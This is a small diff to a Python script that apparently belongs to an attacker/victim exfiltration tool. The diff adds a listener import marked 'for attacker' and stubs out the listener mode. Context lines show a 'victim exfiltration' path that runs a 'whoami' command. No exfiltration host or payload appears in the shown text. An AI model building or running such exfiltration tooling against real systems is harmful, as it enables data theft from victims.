@@ -1,5 +1,6 @@
 import argparse
 import subprocess
+from listener import * # Import listener for attacker
 
 
 # Note, you will need admin/or root privileges to run this script
@@ -167,6 +168,9 @@ def main():
     if args.listen or args.victim:
         if args.listen:
             print("Stepping into listener function")
+            print("[ERROR] Listener in seperate file, not implemented in this script")
+            exit(0)
+            #startListener()
         if args.victim:
             print("[DEBUG] Stepping into victim exfiltration")
             message = command("whoami")
